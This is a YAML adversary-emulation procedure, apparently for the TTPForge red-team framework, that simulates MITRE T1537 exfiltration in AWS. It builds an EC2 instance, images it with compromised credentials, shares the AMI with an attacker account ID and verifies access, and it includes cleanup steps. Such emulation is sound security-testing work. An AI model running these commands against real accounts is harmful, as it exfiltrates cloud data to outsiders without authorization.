---
api_version: 2.0
uuid: ef336123-2118-4729-8143-b2ccfcd5a616
name: transfer_ec2_ami_to_cloud_account
description: |
  This TTP creates a test EC2 instance with an unencrypted EBS volume in the victim's AWS account.
  It then uses compromised credentials to create an AMI of this new EC2 instance. This means your sts-caller-identity must be that of the victim when executing the TTP.
  Finally, it exposes this AMI to an attacker's AWS account and validates this AMI is accessible from attacker account.

args:
  - name: region
    description: Region in which the test EC2 instance with EBS volume should be created.
    default: us-west-2
  - name: instance_name
    description: Name of the EC2 instance to be created
    default: TTPForge-dummy-instance
  - name: attacker_account_id
    description: Attacker AWS account ID that will be used to create and expose AMI of the compromised EC2 instance.

mitre:
  tactics:
    - TA0010 Exfiltration
  techniques:
    - T1537 Transfer Data to Cloud Account


steps:
  - name: create_test_ec2_instance
    description: |
      Creates a new test EC2 instance with an unencrypted EBS volume in the victim's AWS account.
    ttp: //cloud/aws/ec2/create-cloud-instance/create-cloud-instance.yaml
    args:
      instance_name: {{.Args.instance_name}}

  - name: ensure-awsume-cli-present
    description: "Ensure AWSUME CLI is installed."
    inline: |
      if ! [ -x "$(command -v awsume)" ]; then
        echo 'Error: AWSUME CLI is not installed.' >&2
      else
        echo -e "AWSUME CLI is installed: $(awsume --version)"
      fi

  - name: create_ami_from_instance
    description: Uses compromised account to create an AMI of the new test EC2 instance with the unencrypted EBS volume.
    inline: |
      instance_id=$(aws ec2 describe-instances --region {{.Args.region}} --filters "Name=tag:Name,Values={{.Args.instance_name}}" "Name=instance-state-name,Values=pending,running" --query "Reservations[].Instances[0].InstanceId" --output text)
      echo -e "\n***** Creating AMI from the new test EC2 instance: $instance_id with the unencrypted EBS volume. *****"

      if [ ! -z "$instance_id" ]; then
        echo "Checking if the instance $instance_id is in the 'running' state..."

        # Keep checking the instance state every 20 seconds.
        while [ $(aws ec2 describe-instances --instance-ids $instance_id --region {{.Args.region}} --query 'Reservations[*].Instances[*].State.Name' --output text) != "running" ]; do
          echo "Waiting for the instance to be in the 'running' state..."
          sleep 20
        done

        ami_id=$(aws ec2 create-image --instance-id $instance_id --name "{{.Args.instance_name}}_ami" --no-reboot --query 'ImageId' --output text)
        echo "Created AMI ID: $ami_id"
      else
        echo "No instance was created or instance ID is unavailable, skipping AMI creation."
      fi

    cleanup:
      inline: |
        echo -e "\n***** Deregistering the created AMI. *****"
        ami_id=$(aws ec2 describe-images --filters "Name=name,Values={{.Args.instance_name}}_ami" --query 'Images[*].[ImageId]' --output text)
        aws ec2 deregister-image --image-id $ami_id

  - name: expose_ami_to_attacker
    description: Exposes the created AMI to the attacker's AWS account.
    inline: |
      echo -e "\n***** Exposing the created AMI to the attacker's AWS account. *****"
      ami_id=$(aws ec2 describe-images --filters "Name=name,Values={{.Args.instance_name}}_ami" --query 'Images[*].[ImageId]' --output text)

      while [ $(aws ec2 describe-images --region {{.Args.region}} --image-ids $ami_id --query 'Images[*].State' --output text) != "available" ]; do
        echo "Waiting for the AMI to be in 'available' state..."
        sleep 20
      done

      aws ec2 modify-image-attribute --image-id $ami_id --launch-permission "Add=[{UserId={{.Args.attacker_account_id}}}]"
    cleanup:
      inline: |
        echo -e "\n***** Removing the exposure of the AMI from the attacker's AWS account. *****"
        ami_id=$(aws ec2 describe-images --filters "Name=name,Values={{.Args.instance_name}}_ami" --query 'Images[*].[ImageId]' --output text)
        aws ec2 modify-image-attribute --image-id $ami_id --launch-permission "Remove=[{UserId={{.Args.attacker_account_id}}}]"

  - name: confirm_ami_from_attacker_account
    description: |
      Confirm that the AMI created in the victim's account is available from the attacker's account.
      First, retrieve the victim's account ID from the given account name. Then, switch to the attacker's profile using `awsume`.
      Finally, describe all available images that originated from the victim's account ID.
    inline: |
      echo -e "\n***** Retrieving Victim Account ID *****"
      VICTIM_ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
      echo "Victim Account ID: $VICTIM_ACCOUNT_ID"

      echo -e "\n***** Switching to Attacker's AWS Profile *****"
      eval "$(awsume api "{{.Args.attacker_account_id}}" SSOAdmin)"
      echo -e "$(aws sts get-caller-identity)"

      echo -e "\n***** Listing all available AMIs from Victim's Account *****"
      aws ec2 describe-images --owners $VICTIM_ACCOUNT_ID
